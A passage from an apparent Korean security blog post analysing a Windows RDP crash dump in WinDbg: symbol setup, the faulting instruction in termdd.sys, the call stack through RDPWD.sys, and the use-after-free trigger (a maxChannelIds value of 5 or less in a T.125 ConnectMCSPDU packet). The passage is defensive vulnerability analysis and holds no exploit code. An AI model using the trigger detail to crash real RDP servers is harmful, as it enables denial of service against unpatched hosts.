operator\">|</span>                   <span class=\"token operator\">|</span>                                                 <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   경로에 띄어쓰기가 존 재시 따옴표를 통해     <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>     그룹화                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>srv\\<span class=\"token operator\">**</span><span class=\"token operator\">*</span>         <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   심볼 캐쉬 저장할 경로와 심볼 파일이         <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>     존재하는 경로 <span class=\"token punctuation\">(</span>\\<span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> asterisk<span class=\"token punctuation\">)</span> 구분자를 통해  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                   <span class=\"token operator\">|</span>     구분한다<span class=\"token punctuation\">.</span>                                   <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span></code></pre></div>\n<p>심볼 설정을 로드 한 후 지정한 심볼 캐시가 저장될 경로에는 메모리 덤프를\n진행한후 심볼 캐시가 남아있는 모습을 확인할 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAIAAACHqfpvAAAACXBIWXMAAA7EAAAOxAGVKw4bAAAA+UlEQVQY02XQ21KDMBCAYR7B8UIsTTbZEE6isCSpMDiOhyljBRnthe//Kiql1dr/dufbzcS76T7DdgTGGeMAIISAKUQUQjLGpJSccyGElBKO8y7Oz5SA+zvrLCkVIkqcIqqIKEmSoiiyLENErTUe5wVBECX5dmz7zXOSZEKAnCKi1WpVEhlrrbGcc3mSt1hc6ih979tx6PL8GmDGxpi6vq2ocs5Z94MR8T9eLoMovvoY2qFfp2kG4hc3TV1VE7bT5VPMGFNhvH1rXl+eoijefcz+ck0zNrtnH6Yz9n0fVdhvHrr1o9b6MC6JnHNlWRKRMQYAlFJ/t3/jL5VIQEZowl1QAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image47\"\n        title=\"image47\"\n        src=\"/static/c891bde5d422a33711af6f5d4767433b/32056/image47.png\"\n        srcset=\"/static/c891bde5d422a33711af6f5d4767433b/e9ff0/image47.png 180w,\n/static/c891bde5d422a33711af6f5d4767433b/f21e7/image47.png 360w,\n/static/c891bde5d422a33711af6f5d4767433b/32056/image47.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>4. windbg 메모리 덤프 로딩</strong></p>\n<p>심볼 설정을 마치고 windbg에서는 심볼을 다운로드가 완료된 후 !analyze -v\n명령을 통해 메모리 덤프 파일의 상세 정보를 출력한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAIAAADwazoUAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABw0lEQVQoz52NbW+aUBSA+f9ftyXOt0rrW7M/sC6tZhprV61SFURAQPAKhcvbvQoowl1067Iu/bQnT05ykvPkUO3eoPPAdB5GzJQbMbMRwzLTOccLgqQIS0VcqqKsnuZSXSqaqgNVB6s14GVtNOYoVVt7nj9huZt277bzeNPqf231v/dHd93hbXd41x227sffOoN2b3A/nPwYs48M2xtOFN04phnFcnPXgZKsPbHSTNSeeeWZV2aiNhVWk4Uqr6ECHGVzUgbwl6JuOcGWEEJxc17X9ZWmQ9vyPcf3HAdangsdaHuug5EfR+Ex2R+TfZocsiwlr6RpRoGNscVYB8acX7iuEwQoQMiGtmVZ5ssLwhghHAQoDMPtdrfbhdmZ33EYxYSQNTDGY0YQBEmSxLOSJBmGASF0XTeO4+yVN5/DaE8IsWzILxYAANM0IYSBfwJjHEVRkiR/N2/iKD7FjucDsDFNMwiCY5qm7xy/F+/CiBCCEHY9DyGEEd6GMY6S5Pgv6Zk/6+GQUPtDQv4XqlAs1xvNWr1xeVUtFUvlUuWyel2tfSle1POFSpmulC+uaLqSK9G1Rr3ZaBbK9IePn3Kf87l84SfN2VDouVCZFQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image48\"\n        title=\"image48\"\n        src=\"/static/51ede3fb1e4257f0bb7e07559516e64b/d8f62/image48.png\"\n        srcset=\"/static/51ede3fb1e4257f0bb7e07559516e64b/e9ff0/image48.png 180w,\n/static/51ede3fb1e4257f0bb7e07559516e64b/f21e7/image48.png 360w,\n/static/51ede3fb1e4257f0bb7e07559516e64b/d8f62/image48.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 602px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 57.77777777777777%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAIAAADtbgqsAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABXElEQVQoz5WQaUvDQBCG9///ExHUooJYWukXsYf9YGzpkWY3l+bYK9ns0bpJtMVPFcU+8zIwA+/MMGDjrhfz2WI+e3Ucb+Mib7MPd58RRAgFEHoBgm9RSEl+JHB2Ozi/e7y4H150R5fd4c1g2ulPOr1xpz+5fni+6k+veqPL7tPtYHr9MDkS8MMYBjHhAtPyPcNpzgqheCm5UFxILqqyMru6NR/N9odAba3RWitFMGaUcs6MVkZpfWgqWUkp218A7tqFEPkIpWlWFIUQJeeMc84Yq+u6/RPgOC/j8Xi5XK7WqyRJwjAIAj8Kw8D38yzDeS6lNMYopay1x+a3OIYQUcaEELvdbmv2bA9orc13abRW1h4fAiohyqKs66Y9HcAozbOcc26Madu2aU6YAighWZrFcRxFUZIkURRWVXWY8g8zwRhB6HkeoaRpGmvt/5cDzliwf62PCT7p5i/zJxsGpUFmzdXxAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image49\"\n        title=\"image49\"\n        src=\"/static/5a7f0846ff9b7ab54ba2e1c2e9850cce/32056/image49.png\"\n        srcset=\"/static/5a7f0846ff9b7ab54ba2e1c2e9850cce/e9ff0/image49.png 180w,\n/static/5a7f0846ff9b7ab54ba2e1c2e9850cce/f21e7/image49.png 360w,\n/static/5a7f0846ff9b7ab54ba2e1c2e9850cce/32056/image49.png 602w\"\n        sizes=\"(max-width: 602px) 100vw, 602px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>5. 예외 발생 위치 분석</strong></p>\n<p>메모리 덤프 파일에서 볼 수 있듯이 termdd!IcaBufferAllocEx. 함수에서\n오류가 발생한다. 해당주소의 명령어는 fxffff880-0x11c9722에서 포인터를\n읽으려고 시도한다. 다음 명령어는 포인터가 qword 가리키는 점을 참조하여\n그 값을 0과 비교한다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 600px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 45.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABaElEQVQoz32SCYqDQBBFvf/RAoGQReMajLhmG7t6cYn+oZokM8nAFDyqFXz8rtJxXRfMZrPBbrdDWZZo2xZd10EIAa01pJQwxoBrnuc//LwHHJZ5ngff921nCQvqukaaprYPw4D/6inlcljERFFkE7KA07D4crngdru9Uk7T9MZnQiuM49jKDoeDFT+FzOl0ss8sZpRSD7mC0QrSDFD99DYKZ7/fW1EYhjZhVVUgIktRFGiaxp61UriPI8YH9/uIYZww3Od3oR8EYOIkget5OGYZlNaWqq6RFwVaISCUAvU9SMrHnAlCD5DdR8IkCMAckwSB66LKcxgiqLZFU5Zo8hzUthDHI/RmCyMltDHojIHuRpiBhfOvKy8W2C+XiFYr229ZhvF6ha5rFL6PdLtF6rooVivQeg3F6XiWSkKYEdTPbxt3gihCGMfg7ochDmmK5ny2H30J8YJ48/xvEtkrE4+BJAQpu6wn30y6q3uLqd4+AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image50\"\n        title=\"image50\"\n        src=\"/static/27ef0e40a41a7acc083a70a47b79484d/0a47e/image50.png\"\n        srcset=\"/static/27ef0e40a41a7acc083a70a47b79484d/e9ff0/image50.png 180w,\n/static/27ef0e40a41a7acc083a70a47b79484d/f21e7/image50.png 360w,\n/static/27ef0e40a41a7acc083a70a47b79484d/0a47e/image50.png 600w\"\n        sizes=\"(max-width: 600px) 100vw, 600px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p><strong>6. 호출 스택 분석</strong></p>\n<p>호출 스택 부분을 보면 termdd.sys 파일 내부에 IcaBufferAllocEx 함수가\nRDPWD.sys 드라이버에서 호출되며 NM_Disconnect 함수가 다시 호출되어\n세션이 끊어짐과 동시에 오류가 발생하는 것을 알 수 있다.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 44.99999999999999%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAA7EAAAOxAGVKw4bAAABiklEQVQoz6VS7Y6bMBDk/d/qQgIGG9sQCBdFUXtcuAQE5ivJqSF4KvtO/d92pJV3Zq3xSh7n9P6uLpcL6rrWj8cDBlprLMtiy/R/U85HWaq6rtE0je66DrfbDf+MZYFzOB7bn29vaJTSbdehH0aM04RuGNAPgz2HacIwfenDOFrter9jul4tN/r4+YkFgEPdVS8Dgi1jmq5d7ITAPkkQrFZgnofQdcEJAfnm3PetlksJ4fvgngfJGH68rLCEFI7wvF4SgpiGmm3W9uJOCmtgjLjvIQ4C0M0anPgQQYDQXf0xjAlBxjn6osCvqoLDOG9lLCGTWEdmu8MB2yxDyBiSNAWXwszAOAeXEjSK4AUE+X6PbLcDFwLxdouyqnCfZzhRxJSUwgw0pRR5/oo0TRGYrSgFIQQR5/AJAWVffON5yPMcWZZBcI44TnA8Hm0qnKIoVFVV+Dif9ak84Xy+oG1bKNWhVQpKKXRdbzWTAsNNbz9oGGwq5nmGiZyNTVmWqmkadErp5/NpX/kf/AZ6xpXaFkhXrgAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image51\"\n        title=\"image51\"\n        src=\"/static/9783993b41126d7246854b96881c1a44/d8f62/image51.png\"\n        srcset=\"/static/9783993b41126d7246854b96881c1a44/e9ff0/image51.png 180w,\n/static/9783993b41126d7246854b96881c1a44/f21e7/image51.png 360w,\n/static/9783993b41126d7246854b96881c1a44/d8f62/image51.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>파일<span class=\"token operator\">**</span>       <span class=\"token operator\">|</span> <span class=\"token operator\">**</span>내용<span class=\"token operator\">**</span>                                           <span class=\"token operator\">|</span>\n<span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span><span class=\"token operator\">+=</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>RDPWD<span class=\"token punctuation\">.</span>sys<span class=\"token operator\">**</span>  <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   RDP 터미널 스택 드라이버                       <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span>\n<span class=\"token operator\">|</span> <span class=\"token operator\">**</span>termdd<span class=\"token punctuation\">.</span>sys<span class=\"token operator\">**</span> <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   RDP의 구성 요소 및 터미널 서버 드라이버        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>                                                    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   마우스 및 키보드 드라이버는 termdd<span class=\"token punctuation\">.</span>sys를 통해  <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>     통신한다<span class=\"token punctuation\">.</span>                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>                                                    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   마우스 및 키보드 작업에 대한 메시지를 RDP      <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>     드라이버와 주고받는다<span class=\"token punctuation\">.</span>                         <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>                                                    <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span> <span class=\"token operator\">-</span>   RDP 클라이언트 세션을 원격으로 사용하고        <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span>                <span class=\"token operator\">|</span>     커뮤니케이션이 가능하다<span class=\"token punctuation\">.</span>                       <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">+</span></code></pre></div>\n<p><strong>7. 오류 발생 흐름도</strong>\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 601px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 64.44444444444444%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7EAAAOxAGVKw4bAAADkElEQVQ4y2WSa0xTBxiG31M6fijBXZi7hEHvp6c950BbSk/XQNnmZYpkQWFT6YQxpkRkErOY6calA7kUOCb+mMPL9mObJhhNxtwwG4smDipDjXPoRgNMhUY3bAKMEETabzm6mBm+5Pn35cl3ecFaMsFZXQlWXkoXBInjBTcriG4TL7p1GaJbJ/KSneclu4WXHDpTujFZL+qMrF3keMnBWaU0jpecLJcZ99AjAWmOnDgAqCrKxcnmUnxZX4of5K04daQco++9hXOrclHtzUXnuwU4u6U6adxXbu96R06o3lWG5ak2WMSXodVboTeKMFsyAZZzdulNjo5A5XothZqeudv90XP3zuxZPvt385O0vcg74ytmCVC1/jy8Tb45e0v+c2aweXTmRm1/eF3j7/+g6mRvnEbLQWcQYOacQJZ37cjKNYX0Vc2mYzTU0TjX196+EJRbaSDQ+teBrQdvbyhOARGartxp3R+eo2+7z1Pb+Bz5r0a2+69Pov63u2rO6sZDlJVtWf0OZw49nyK+UvJmPogINHsG7U2VwFLTi7CvXtLS0Ym9wXDWvmuRo+0Dtw40DEYO1Zy/aavpG0Nt3xiD/5fOYLO/lMpLNpvnWeAJfCF/zAQ+3MHEL9HALrotNoszSemrH11AU2gKB4MhNIamUXchjLqLdxj/wO3HfNDq05GcYoWOlVCxcQ2IvsFqbzajMTqV77OsxfWUmPkaKo6dVTWHptSf9o+oG4em1LUXwszeSxPAEGHYtw3jvjLsev8wlM+o/gOPMD+CM3Oup5N1NpTmr8D94+Ug6kGsZCMTKypiCMDn18IqEDHKndsmKQ4GowNmThG5HmBkHWAFF2MWXMhYtTJJdOfEr12RDaJ8kD8PUYsPsYJCxDZtBsUnorN3EATEE7CsZZoeX18RmswZKhObAdbsLDBYHKcNZruARB51BQ4V7V7HRD2bEV1f+MJ8cYlGEbVeDO/ZH5rsCQxPf9dwdeL4ImGaLUstpHsgiO6a7FffoOINeUG6LAfm+9rkaG+LHL0sB2JHK76Olr2drczTdGP2yqHhCJ0IDtK+8XlaJBTSPGqr4IaFl3Z7sl6nDKf3J6IJ1diJHcuiPTsTYqcrE+eoJZ5US9F9fwF1f0w3yNcnLn32y8i5T4amf1wkNBjtMJgcYLlMe6pW3KLR29xEfkS6qkDBDxD7ficW7tViwpPHKJk9peT2AWH8SoR/AQaCd0YA0iH7AAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"image52\"\n        title=\"image52\"\n        src=\"/static/ac276d6e7746d2888cb961261912dfc0/d8f62/image52.png\"\n        srcset=\"/static/ac276d6e7746d2888cb961261912dfc0/e9ff0/image52.png 180w,\n/static/ac276d6e7746d2888cb961261912dfc0/f21e7/image52.png 360w,\n/static/ac276d6e7746d2888cb961261912dfc0/d8f62/image52.png 601w\"\n        sizes=\"(max-width: 601px) 100vw, 601px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<p>Luigi Auriemma가 처음 보고한 바와 같이 Use-After-Free 취약성은 5이하의\n값으로 설정되었을 때 T.125 ConnectMCSPDU 패킷의 maxChannelids 필드에서\n오류가 발생한다는 사실을 알 수 있다. 해당 문제는\nRDPWD!NM_Disconnect시작하는 동안 사용자의 접속을 끊고 발생되지만 메모리\n덤프를 통해서 알아본 결과 exploit 코드로 인해 발생하는 